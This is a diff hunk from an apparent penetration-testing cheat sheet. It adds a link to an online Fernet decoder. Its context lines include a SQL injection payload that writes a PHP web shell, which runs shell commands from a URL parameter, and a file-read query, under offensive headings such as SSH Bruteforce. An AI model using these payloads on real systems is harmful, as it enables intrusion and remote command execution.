@@ -273,6 +273,10 @@ select load_file('<FILE>');
 select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '<OUT_FILE>'
 ```
 
+### Fernet Decoder
+
+https://asecuritysite.com/encryption/ferdecode
+
 # Initial Access
 
 ## SSH Bruteforce
